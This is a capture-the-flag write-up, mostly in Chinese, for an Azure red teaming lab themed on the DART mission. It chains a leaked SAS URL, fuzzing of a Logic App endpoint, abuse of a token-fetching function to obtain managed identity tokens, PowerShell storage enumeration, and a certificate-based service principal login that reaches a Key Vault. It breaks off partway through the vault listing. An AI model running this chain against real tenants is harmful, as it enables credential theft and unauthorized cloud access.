# Azure Red Teaming

## Introduction

Welcome to the DART CTF. Themed on the DART mission that deflected an asteroid by hitting it head-on. The CTF is designed to be fun and challenging!

It tests your understanding of Azure Security and problem-solving skills. Enjoy!

At Altered Security, we specialize in hands-on enterprise security training and have trained over 7,000 security professionals in Enterprise and Azure security. Recognizing the growing need for structured and high-quality learning material, we present "Introduction to Azure Red Teaming."

## Solution Process

这套环境是一个独立的入口 `https://initiatedart.z13.web.core.windows.net/`

![img](img/image_20260133-223309.png)

### Flag 1

在 html 源码中，可以看到以下站外链接

```plaintext
https://tsarray.blob.core.windows.net/azure-webjobs-secrets/DART.jpg?sv=2024-11-04&ss=b&srt=sco&sp=rlt&se=2030-04-30T14:54:09Z&st=2025-04-30T06:54:09Z&spr=https,http&sig=%2Fk8IU2lU0lPViOEAkGmsWUNmKeoA7GhgmOgQqef45U4%3D
https://raw.githubusercontent.com/AlteredSecurity/DARTApp/main/variables.css
```

在 `https://raw.githubusercontent.com/AlteredSecurity/DARTApp/main/variables.css` 文件中，可以获得以下信息

```css
/**
* Template Name: HeroBiz
* File: variables.css
* Description: Easily customize colors, typography, and other repetitive properties used in the template main stylesheet file main.css
* 
* Template URL: https://bootstrapmade.com/herobiz-bootstrap-business-template/
* Author: BootstrapMade.com
* License: https://bootstrapmade.com/license/
* 
* Contents:
* 1. HeroBiz template variables 
* 2. Override default Bootstrap variables
* 3. Set color and background class names
*
* Learn more about CSS variables at https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties
* 
* https://prod-61.eastus.logic.azure.com:443/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/test?
* Flag 1 : Launch confirmed. DART is on right path. 
*/
```

### Flag 2

在 css 文件中，可以看到这个端点

```plaintext
https://prod-61.eastus.logic.azure.com/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/test?
```

尝试直接访问，会获得

```json
{
    "error": {
        "code": "MissingApiVersionParameter",
        "message": "The api-version query parameter (?api-version=) is required for all requests."
    }
}
```

根据报错信息，加上对应的参数

```plaintext
https://prod-61.eastus.logic.azure.com/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/test?api-version=1
```

获得的返回是

```json
{
    "error": {
        "code": "InvalidApiVersionParameter",
        "message": "The api-version '1' is not valid. The supported versions are '2015-02-01-preview,2015-08-01-preview,2016-06-01,2016-10-01,2017-07-01,2018-03-01-preview,2018-07-01-preview,2019-05-01,2019-06-01-preview,2022-09-01-preview,2023-11-14-preview,2024-06-01-preview,2024-04-01-preview,2025-06-01-preview'."
    }
}
```

尝试进行批量枚举

```python
import requests

base_url= "https://prod-61.eastus.logic.azure.com/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/test?api-version="

versions = "2015-02-01-preview,2015-08-01-preview,2016-06-01,2016-10-01,2017-07-01,2018-03-01-preview,2018-07-01-preview,2019-05-01,2019-06-01-preview,2022-09-01-preview,2023-11-14-preview,2024-06-01-preview,2024-04-01-preview,2025-06-01-preview"

for version in versions.split(","):
    full_url = base_url + version
    try:
        response = requests.get(full_url, timeout=10)
        print(f"Version: {version} | Status Code: {response.status_code} | Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Version: {version} | Error: {e}")
```

获得执行的结果

```plaintext
Version: 2015-02-01-preview | Status Code: 400 | Response: {"error":{"code":"InvalidApiVersionParameter","message":"The api-version '2015-02-01-preview' is not supported. Supported versions are: '2015-08-01-preview'."}}
Version: 2015-08-01-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The authentication scheme is required. Please add authentication scheme and try again."}}
Version: 2016-06-01 | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2016-10-01 | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2017-07-01 | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2018-03-01-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2018-07-01-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2019-05-01 | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2019-06-01-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2022-09-01-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2023-11-14-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2024-06-01-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2024-04-01-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
Version: 2025-06-01-preview | Status Code: 401 | Response: {"error":{"code":"DirectApiAuthorizationRequired","message":"The request must be authenticated only by Shared Access scheme."}}
```

很明显，还缺少必要的认证参数

同时，在页面中，可以看到这个请求

```plaintext
https://tsarray.blob.core.windows.net/azure-webjobs-secrets/DART.jpg?sv=2024-11-04&ss=b&srt=sco&sp=rlt&se=2030-04-30T14:54:09Z&st=2025-04-30T06:54:09Z&spr=https,http&sig=%2Fk8IU2lU0lPViOEAkGmsWUNmKeoA7GhgmOgQqef45U4%3D
```

根据url结构，可以确定为 BLob Container的SAS URL信息，将文件名信息从URL中去除后，可以得到

```plaintext
https://tsarray.blob.core.windows.net/azure-webjobs-secrets?sv=2024-11-04&ss=b&srt=sco&sp=rlt&se=2030-04-30T14:54:09Z&st=2025-04-30T06:54:09Z&spr=https,http&sig=%2Fk8IU2lU0lPViOEAkGmsWUNmKeoA7GhgmOgQqef45U4%3D
```

尝试访问后，可以看到

![img](img/image_20260155-225511.png)

```plaintext title="OSIRIS-REx.txt"
6de8103e-049a-4f88-9abf-41099a79ca53
```

对这个 Blob Container进行排查，在 `OSIRIS-REx.txt`文件的历史版本中，发现

![img](img/image_20260156-225657.png)

```plaintext
api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=avLLG0xOCALGGT-7zmIJsddcUiL5o2GOijT4mPSA4JY
```

尝试将这个参数接到上面获取的端点中进行交互

```plaintext
https://prod-61.eastus.logic.azure.com/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/test?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=avLLG0xOCALGGT-7zmIJsddcUiL5o2GOijT4mPSA4JY
```

可惜获得的返回是

```plaintext
Warning: An error has occurred in the Azure Logic App. The app has detected a problem with one or more of its components and is unable to complete the requested task. This could be due to a misconfiguration or an issue with one of the connectors being used. To troubleshoot the issue, please review the app's configuration and make any necessary adjustments. If the issue persists, please contact technical support for assistance in resolving the issue.

It is recommended to review the app's logs to determine the source of the issue. The logs may contain more detailed information about the error and can be used to identify the specific component that is causing the problem. Additionally, please ensure that all required connectors are properly configured and authenticated.

Please note that any issues with the app may impact other services that are relying on it, so it is important to address the issue as soon as possible. Thank you for your attention to this matter.
```

注意到端点中的参数 `test` 不同寻常，尝试进行模糊爆破

```shell
┌──(randark㉿kali)-[~]
└─$ ffuf -u 'https://prod-61.eastus.logic.azure.com/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/FUZZ?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=avLLG0xOCALGGT-7zmIJsddcUiL5o2GOijT4mPSA4JY' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://prod-61.eastus.logic.azure.com/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/FUZZ?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=avLLG0xOCALGGT-7zmIJsddcUiL5o2GOijT4mPSA4JY
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.swf                    [Status: 200, Size: 980, Words: 162, Lines: 5, Duration: 524ms]
.gitmodules             [Status: 200, Size: 980, Words: 162, Lines: 5, Duration: 555ms]
.gitignore              [Status: 200, Size: 980, Words: 162, Lines: 5, Duration: 564ms]
.gitattributes          [Status: 200, Size: 980, Words: 162, Lines: 5, Duration: 541ms]
.svnignore              [Status: 200, Size: 980, Words: 162, Lines: 5, Duration: 555ms]
.cvsignore              [Status: 200, Size: 980, Words: 162, Lines: 5, Duration: 627ms]
.listing                [Status: 200, Size: 980, Words: 162, Lines: 5, Duration: 701ms]
.cache                  [Status: 200, Size: 980, Words: 162, Lines: 5, Duration: 680ms]
......
```

通过特征 `Words: 162` 对爆破结果进行筛除

```shell
┌──(randark㉿kali)-[~]
└─$ ffuf -u 'https://prod-61.eastus.logic.azure.com/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/FUZZ?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=avLLG0xOCALGGT-7zmIJsddcUiL5o2GOijT4mPSA4JY' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fw 162

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://prod-61.eastus.logic.azure.com/workflows/250827f3ebc54c368f85643619f38ce3/triggers/manual/paths/invoke/FUZZ?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=avLLG0xOCALGGT-7zmIJsddcUiL5o2GOijT4mPSA4JY
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 162
________________________________________________

action                  [Status: 200, Size: 1049, Words: 303, Lines: 34, Duration: 859ms]
debug                   [Status: 200, Size: 403, Words: 48, Lines: 12, Duration: 499ms]
```

对于 `debug`参数，访问得到

```plaintext
Imp = b'Use the same carefully'
MyValue =  b'a*)h\x1f/!U9&\x1f\x1cz\x19\x038\r%/?\x15)\x10\x1d\t\x15A\\\nt&S8:L2%7\tW\x1dZ54\x14\t#U8\r?b70PX'

def enc(MyValue):
    bytevalue = bytearray()
    for i in range(len(MyValue)):
        bytevalue.append(MyValue[i] ^ Imp[i % len(Imp)])
    return bytes(bytevalue)

value = enc(MyValue.encode())
print(value)
Flag 2 : Telemetry check-in confirmed.
```

### Flag 3

对于上文得到的Python脚本

```python
Imp = b'Use the same carefully'
MyValue =  b'a*)h\x1f/!U9&\x1f\x1cz\x19\x038\r%/?\x15)\x10\x1d\t\x15A\\\nt&S8:L2%7\tW\x1dZ54\x14\t#U8\r?b70PX'

def enc(MyValue):
    bytevalue = bytearray()
    for i in range(len(MyValue)):
        bytevalue.append(MyValue[i] ^ Imp[i % len(Imp)])
    return bytes(bytevalue)

value = enc(MyValue.encode())
print(value)
```

对其进行小小的改动，将其语法适配Python3

```python
Imp = b'Use the same carefully'
MyValue =  b'a*)h\x1f/!U9&\x1f\x1cz\x19\x038\r%/?\x15)\x10\x1d\t\x15A\\\nt&S8:L2%7\tW\x1dZ54\x14\t#U8\r?b70PX'

def enc(MyValue):
    bytevalue = bytearray()
    for i in range(len(MyValue)):
        bytevalue.append(MyValue[i] ^ Imp[i % len(Imp)])
    return bytes(bytevalue)

value = enc(MyValue)
print(value)
```

运行得到

```plaintext
b'4YLHkG******6YMAzFuLeZBDQ=='
```

根据常识，将其加上一层 Base64 Decode操作

```python
from base64 import b64decode

Imp = b'Use the same carefully'
MyValue =  b'a*)h\x1f/!U9&\x1f\x1cz\x19\x038\r%/?\x15)\x10\x1d\t\x15A\\\nt&S8:L2%7\tW\x1dZ54\x14\t#U8\r?b70PX'

def enc(MyValue):
    bytevalue = bytearray()
    for i in range(len(MyValue)):
        bytevalue.append(MyValue[i] ^ Imp[i % len(Imp)])
    return bytes(bytevalue)

value = enc(MyValue)
# print(value)

value = b64decode(value.decode())
print(value.decode())
```

但是得到了报错 `binascii.Error: Invalid base64-encoded string: number of data characters (53) cannot be 1 more than a multiple of 4`

经过 CyberChef 解码，确定不是普通的Base64编码的字符串

![img](img/image_20260115-231531.png)

将这份 Base64 编码搁置一旁，继续探索先前连接的 Blob Container储存容器，在里面还有 `rosarray` 文件夹还没有检查

![img](img/image_20260117-231727.png)

```json title="host.json"
{
    "masterKey": {
        "name": "master",
        "value": "CfDJ8AAAAAAAAAAAAAAAAAAAAAAzpeADcTSwJp_43EQyqIRSd-uDekfdk8Wsk-wIMBlo3GD8da3dL59uaDtstCis3_UB1j-mA_U6zkjKg2cCZxHC7AOPogXiTLiLeUIhO7AJxh5LslOn51LNWNetdEYjPxiWAT4Vl5mVJoJ_DmvZ_PRinq7Sv3jWs1Q7gVO7C_VxtQ",
        "encrypted": true
    },
    "functionKeys": [
        {
        "name": "default",
        "value": "CfDJ8AAAAAAAAAAAAAAAAAAAAABzWmb45YZ95DyetB5fIg--SuQR1bxk4UZ2s8lYXmY3ODMFoPj4wPJWqUupY3OYCvqwGAXQAjVbHDjoBmn7QMDlquz8BNpjEOtZY70apNKmNk1228gnA5FK4F306Ra6awG_cooIuKAuVPTC6RUiHRBkHctVagML4o03bvzsrIhG0w",
        "encrypted": true
        }
    ],
    "systemKeys": [],
    "hostName": "rosarray.azurewebsites.net",
    "instanceId": "0000000000000000000000002B233D22",
    "source": "runtime",
    "decryptionKeyId": "AzureWebEncryptionKey=71K9CPtGDRphMirq9D21FkBghc3YmeQlIbrYA93zK1c=;"
}
```

```json title="deployer.json"
{
    "keys": [
        {
        "name": "default",
        "value": "CfDJ8AAAAAAAAAAAAAAAAAAAAACySloWXZj5BQqDaJAciFzbvl05A5_XcJEysETsnWFCWkssLhWrbMrAkODRp0us2hJz9zZ4Ncpl5f_GcexVKZol7B0ttqzLcv4SEOHYCn8teBEoOLGm5ADlbFI6SBFCytDKgWo3Ko8EhXFbw7ypysRPXrfCMamaKnPYu1twW6Gh0g",
        "encrypted": true
        }
    ],
    "hostName": "rosarray.azurewebsites.net",
    "instanceId": "0000000000000000000000000403D027",
    "source": "runtime",
    "decryptionKeyId": "AzureWebEncryptionKey=71K9CPtGDRphMirq9D21FkBghc3YmeQlIbrYA93zK1c=;"
}
```

```json title="canister.json"
{
    "keys": [
        {
        "name": "default",
        "value": "CfDJ8AAAAAAAAAAAAAAAAAAAAAAtCjMDQrEZW7OyShi4qC7autHbJ61Te6GcgFDj7N47Vz0pl04lIqDRtlWz8Tj9038K9CwQs0OsSFO_4E_F8fkGo-D8p81Zlk4h4WLhjyyzwQ1GhW00D4kcib5kGLT02StUHLVKOQI3D7YImDXD6dMZu4MId2zcOlqIe7r7Vda6xw",
        "encrypted": true
        }
    ],
    "hostName": "rosarray.azurewebsites.net",
    "instanceId": "0000000000000000000000006B282786",
    "source": "runtime",
    "decryptionKeyId": "AzureWebEncryptionKey=71K9CPtGDRphMirq9D21FkBghc3YmeQlIbrYA93zK1c=;"
}
```

```json title="blanket.json"
{
    "keys": [
        {
        "name": "default",
        "value": "CfDJ8AAAAAAAAAAAAAAAAAAAAAD9wsuBOAoIYUE14L8q6MaGzJyQFotW7XZSn1Cf4xTtXF6Pm8RDXB7vRJrmmL0krT0D8O7bZs5dQGED51rUcadQLvGaYYH4aPJzx9lfXarajHe6ZCjChYEU3jtcy265ueSa1k-J6hz2XmP6kjI-gB0yxt3zCf0rkhJOjgR6-6DI3w",
        "encrypted": true
        }
    ],
    "hostName": "rosarray.azurewebsites.net",
    "instanceId": "0000000000000000000000002B233D22",
    "source": "runtime",
    "decryptionKeyId": "AzureWebEncryptionKey=71K9CPtGDRphMirq9D21FkBghc3YmeQlIbrYA93zK1c=;"
}
```

根据json文件所定义的路由，尝试访问 `blanket` 接口，并使用`code`参数，带上先前发现的base64字符串

```plaintext
https://rosarray.azurewebsites.net/api/blanket?code=4YLHkG******6YMAzFuLeZBDQ==
```

访问得到

```plaintext
Warning: Incorrect action request received. The requested action is not recognized or not currently possible. Please verify the request and try again. If the issue persists, please contact mission control for further guidance.
            Flag 3 : Anomaly detected in spacecraft trajectory.
```

### Flag 4

在 `Flag 2`中，爆破得到的 `action` 参数，访问得到

```plaintext
import requests

def retrieve(code):
    if code:
        response = requests.get(f'https://rosarray.azurewebsites.net/api/Canister?code={code}')

        if response.status_code == 200:
            results = response.json()
            return results
        else:
            return {
                "error": {
                    "message": "Oops! Something went wrong. Please try again later.",
                    "code": "500"
                }
            }
    else:
        return {
            "error": {
                "message": "Please provide a appropriate value to access the endpoint.",
                "code": "400"
            }
        }


code = "7CI******rA=="
results = retrieve(code)
if "error" in results:
    print(f"Error: {results['error']['message']} ({results['error']['code']})")
else:
    print(f"Found {len(results)} results for '{code}':")
    for result in results:
        print(result)
Flag 4 : Adjust spacecraft altitude by 5 degrees.
```

### Flag 5

对上文发现的Python脚本

```python
import requests

def retrieve(code):
    if code:
        response = requests.get(f'https://rosarray.azurewebsites.net/api/Canister?code={code}')

        if response.status_code == 200:
            results = response.json()
            return results
        else:
            return {
                "error": {
                    "message": "Oops! Something went wrong. Please try again later.",
                    "code": "500"
                }
            }
    else:
        return {
            "error": {
                "message": "Please provide a appropriate value to access the endpoint.",
                "code": "400"
            }
        }


code = "7CI******rA=="
results = retrieve(code)
if "error" in results:
    print(f"Error: {results['error']['message']} ({results['error']['code']})")
else:
    print(f"Found {len(results)} results for '{code}':")
    for result in results:
        print(result)
```

实际执行中，会发现会因json解码错误而终止执行，尝试获取原始返回

```plaintext
import requests
import json

def retrieve(code):
    if code:
        response = requests.get(f'https://rosarray.azurewebsites.net/api/Canister?code={code}')

        if response.status_code == 200:
            results = response.text
            return results


code = "7CI******rA=="
results = retrieve(code)
print(results)
```

得到的返回是

```plaintext
            {
    "keys": {
        "self": "li1u******5vw=="
    },
    "id": "2000433",
    "neo_reference_id": "2000433",
    "name": "433 Eros (A898 PA)",
    "name_limited": "Eros",
    "designation": "433",
    "nasa_jpl_url": "https://rosarray.azurewebsites.net/api/Deployer",
    "absolute_magnitude_h": 10.4,
    "estimated_diameter": {
        "kilometers": {
            "estimated_diameter_min": 22.1082810359,
            "estimated_diameter_max": 49.435619262
        },
        "meters": {
            "estimated_diameter_min": 22108.281035909,
            "estimated_diameter_max": 49435.619261962
        },
        "miles": {
            "estimated_diameter_min": 13.7374446956,
            "estimated_diameter_max": 30.7178601764
        },
        "feet": {
            "estimated_diameter_min": 72533.7327538517,
            "estimated_diameter_max": 162190.3570994153
        }
    },
    "is_potentially_hazardous_asteroid": false,
    "close_approach_data": [
        {
            "close_approach_date": "1900-12-27",
            "close_approach_date_full": "1900-Dec-27 01:30",
            "epoch_date_close_approach": -2177879400000,
            "relative_velocity": {
                "kilometers_per_second": "5.5786203614",
                "kilometers_per_hour": "20083.0333009607",
                "miles_per_hour": "12478.8158863664"
            },
            "miss_distance": {
                "astronomical": "0.3149291092",
                "lunar": "122.5074234788",
                "kilometers": "47112723.937317404",
                "miles": "29274489.1785480152"
            },
            "orbiting_body": "Earth"
        }
    ],
    "orbital_data": {
        "orbit_id": "658",
        "orbit_determination_date": "2020-09-06 18:22:27",
        "first_observation_date": "1893-10-29",
        "last_observation_date": "2020-09-03",
        "data_arc_in_days": 46330,
        "observations_used": 8767,
        "orbit_uncertainty": "0",
        "minimum_orbit_intersection": ".148623",
        "jupiter_tisserand_invariant": "4.582",
        "epoch_osculation": "2459000.5",
        "eccentricity": ".2229512647434284",
        "semi_major_axis": "1.458045729081037",
        "inclination": "10.83054121829922",
        "ascending_node_longitude": "304.2993259000444",
        "orbital_period": "643.0654021001488",
        "perihelion_distance": "1.132972589728666",
        "perihelion_argument": "178.8822959227224",
        "aphelion_distance": "1.783118868433408",
        "perihelion_time": "2459159.351922368362",
        "mean_anomaly": "271.0717325705167",
        "mean_motion": ".5598186418120109",
        "equinox": "J2000",
        "orbit_class": {
            "orbit_class_type": "AMO",
            "orbit_class_description": "Near-Earth asteroid orbits similar to that of 1221 Amor",
            "orbit_class_range": "1.017 AU < q (perihelion) < 1.3 AU"
        },
        "is_sentry_object": false
        "Flag 5" : "Spacecraft velocity 23,760 km/h."
    }
}
```

### Flag 6

根据返回的信息，组合为新的接口

```plaintext
https://rosarray.azurewebsites.net/api/Deployer?code=li1u******5vw==
```

访问得到

```plaintext
Error: Missing required query string parameter. Please check your request and try again.

To retrieve the requested resource, you must include the following query string parameter:
  - Endpoint 

Possible reasons for this error include:
  - You forgot to include the query string parameter in your request.
  - You misspelled the query string parameter name.
  - You provided an invalid value for the query string parameter.

Please make sure that you include the correct query string parameter in your request and try again.
Flag 6 : Course correction burn deployed.
```

### Flag 7

根据上文的报错信息，尝试访问

```plaintext
https://rosarray.azurewebsites.net/api/Deployer?code=li1u******5vw==&Endpoint=1
```

得到的返回是

```json
{
    "statusCode": 500,
    "message": "An unexpected error occured while fetching the AAD Token.",
    "correlationId": "14e7d619-861b-4ad4-aea9-332be0068774"
}
```

根据报错信息中的 `fetching the AAD Token` 信息，尝试将 `Endpoint` 参数传入 `https://management.azure.com`

```plaintext
https://rosarray.azurewebsites.net/api/Deployer?code=li1u******5vw==&Endpoint=https://management.azure.com
```

得到的返回是

```json
{
    "access_token": "ey******Hng",
    "expires_on": "01/21/2026 15:35:47 +00:00",
    "resource": "https://management.azure.com",
    "token_type": "Bearer",
    "client_id": "9f248a3c-f116-4865-a1be-48ffd0304937"
}
```

已经获得access_token的前提下，尝试连接到Azure Account

```powershell
$access_token="ey******Hng"
Connect-AzAccount -AccessToken $access_token -AccountId 9f248a3c-f116-4865-a1be-48ffd0304937
```

执行得到

```powershell
PS C:\Users\Randark> Connect-AzAccount -AccessToken $access_token -AccountId 9f248a3c-f116-4865-a1be-48ffd0304937

Subscription name Tenant
----------------- ------
dartsub           5f487283-b88e-4ade-8035-7bcaac4156b3
```

已经连接到Azure账户之后，查看所有资源

```powershell
PS C:\Users\Randark> Connect-AzAccount -AccessToken $access_token -AccountId 9f248a3c-f116-4865-a1be-48ffd0304937

Subscription name Tenant
----------------- ------
dartsub           5f487283-b88e-4ade-8035-7bcaac4156b3

PS C:\Users\Randark> Get-AzResource

Name              : coresat
ResourceGroupName : DARTMission
ResourceType      : Microsoft.Storage/storageAccounts
Location          : eastus
ResourceId        : /subscriptions/7b9bd916-8bd2-4446-9678-8531ef663edb/resourceGroups/DARTMission/providers/Microsoft.
                    Storage/storageAccounts/coresat
Tags              :
```

看起来有一个名为`coresat`的储存账户可以访问

先访问 `https://rosarray.azurewebsites.net/api/Deployer?code=li1u******5vw==&Endpoint=https://storage.azure.com` 获取token

```json
{
    "access_token": "ey******QQ",
    "expires_on": "01/21/2026 15:46:02 +00:00",
    "resource": "https://storage.azure.com",
    "token_type": "Bearer",
    "client_id": "9f248a3c-f116-4865-a1be-48ffd0304937"
}
```

```powershell
$STGToken="ey******QQ"
$URL = "https://coresat.blob.core.windows.net/?comp=list"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = @{
        "Content-Type" = "application/json"
        "Authorization" = "Bearer $STGToken"
        "x-ms-version" = "2017-11-09"
        "accept-encoding" = "gzip, deflate"
    }
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result
```

得到返回

```xml
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://coresat.blob.core.windows.net/">
    <Containers>
        <Container>
            <Name>datahandling</Name>
            <Properties>
                <Last-Modified>Wed, 15 Mar 2023 14:38:57 GMT</Last-Modified>
                <Etag>"0x8DB256302872266"</Etag>
                <LeaseStatus>unlocked</LeaseStatus>
                <LeaseState>available</LeaseState>
                <HasImmutabilityPolicy>false</HasImmutabilityPolicy>
                <HasLegalHold>false</HasLegalHold>
            </Properties>
        </Container>
    </Containers>
    <NextMarker />
</EnumerationResults>
```

得知存在有一个Blob Container `datahandling` 存在，尝试进行读取

```powershell
$URL ="https://coresat.blob.core.windows.net/datahandling?restype=container&comp=list"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = @{
        "Content-Type" = "application/json"
        "Authorization" = "Bearer $STGToken"
        "x-ms-version" = "2017-11-09"
        "accept-encoding" = "gzip, deflate"
    }
}
Invoke-RestMethod @Params -UseBasicParsing
```

得到返回

```xml
<?xml version="1.0" encoding="utf-8"?>
<EnumerationResults ServiceEndpoint="https://coresat.blob.core.windows.net/"
    ContainerName="datahandling">
    <Blobs>
        <Blob>
            <Name>Flag7.txt</Name>
            <Properties>
                <Creation-Time>Fri, 17 Mar 2023 09:51:14 GMT</Creation-Time>
                <Last-Modified>Fri, 17 Mar 2023 09:51:14 GMT</Last-Modified>
                <Etag>0x8DB26CD25E0F3A3</Etag>
                <Content-Length>47</Content-Length>
                <Content-Type>text/plain</Content-Type>
                <Content-Encoding />
                <Content-Language />
                <Content-MD5>d1UOmf3KFXonNzNJvZB+5Q==</Content-MD5>
                <Cache-Control />
                <Content-Disposition />
                <BlobType>BlockBlob</BlobType>
                <AccessTier>Hot</AccessTier>
                <AccessTierInferred>true</AccessTierInferred>
                <LeaseStatus>unlocked</LeaseStatus>
                <LeaseState>available</LeaseState>
                <ServerEncrypted>true</ServerEncrypted>
            </Properties>
        </Blob>
        <Blob>
            <Name>LORRI-Cert.txt</Name>
            <Properties>
                <Creation-Time>Wed, 15 Mar 2023 14:39:51 GMT</Creation-Time>
                <Last-Modified>Mon, 28 Apr 2025 10:37:57 GMT</Last-Modified>
                <Etag>0x8DD8640BDA459CC</Etag>
                <Content-Length>3412</Content-Length>
                <Content-Type>application/octet-stream</Content-Type>
                <Content-Encoding />
                <Content-Language />
                <Content-MD5>dd37xf/uHnmuCpMqQ/FCKg==</Content-MD5>
                <Cache-Control />
                <Content-Disposition />
                <BlobType>BlockBlob</BlobType>
                <AccessTier>Hot</AccessTier>
                <AccessTierInferred>true</AccessTierInferred>
                <LeaseStatus>unlocked</LeaseStatus>
                <LeaseState>available</LeaseState>
                <ServerEncrypted>true</ServerEncrypted>
            </Properties>
        </Blob>
    </Blobs>
    <NextMarker />
</EnumerationResults>
```

获取两个文件的内容

```powershell
$URL = "https://coresat.blob.core.windows.net/datahandling/Flag7.txt"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = @{
        "Content-Type" = "application/json"
        "Authorization" = "Bearer $STGToken"
        "x-ms-version" = "2017-11-09"
        "accept-encoding" = "gzip, deflate"
    }
}
Invoke-RestMethod @Params -UseBasicParsing
```

```plaintext title="Flag7.txt"
Flag 7 : All systems are functioning normally.
```

```powershell
$URL = "https://coresat.blob.core.windows.net/datahandling/LORRI-Cert.txt"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = @{
        "Content-Type" = "application/json"
        "Authorization" = "Bearer $STGToken"
        "x-ms-version" = "2017-11-09"
        "accept-encoding" = "gzip, deflate"
    }
}
Invoke-RestMethod @Params -UseBasicParsing
```

```plaintext title="LORRI-Cert.txt"
MIIJ******9A=
```

### Flag 8

将上文的Base64进行解码后，储存为`LORRI-Cert.pfx`证书文件

安装证书文件之后，查看证书

```powershell
PS C:\Users\Randark> Get-ChildItem Cert:\CurrentUser\my

   PSParentPath: Microsoft.PowerShell.Security\Certificate::CurrentUser\my

Thumbprint                                Subject              EnhancedKeyUsageList
----------                                -------              --------------------
......
7A0AB1073D9CFE4573FD020A5AE463AA44E51A76  CN=DART              {客户端身份验证, 服务器身份验证}
```

尝试使用这个证书请求资源

```powershell
PS C:\Users\Randark> Connect-AzAccount -ServicePrincipal -ApplicationId 6de8103e-049a-4f88-9abf-41099a79ca53 -CertificateThumbprint 7A0AB1073D9CFE4573FD020A5AE463AA44E51A76 -Tenant 5f487283-b88e-4ade-8035-7bcaac4156b3

Subscription name Tenant
----------------- ------
dartsub           5f487283-b88e-4ade-8035-7bcaac4156b3

PS C:\Users\Randark> Get-AzResource

Name              : CubeSat
ResourceGroupName : DARTMission
ResourceType      : Microsoft.KeyVault/vaults
Location          : eastus
ResourceId        : /subscriptions/7b9bd916-8bd2-4446-9678-8531ef663edb/resourceGroups/DARTMission/providers/Microsoft.
                    KeyVault/vaults/CubeSat
Tags              :
```

对这个 Key Vault 进行枚举

```powershell
PS C:\Users\Randark> Get-AzKeyVaultSecret -VaultName CubeSat

Vault Name   : cubesat
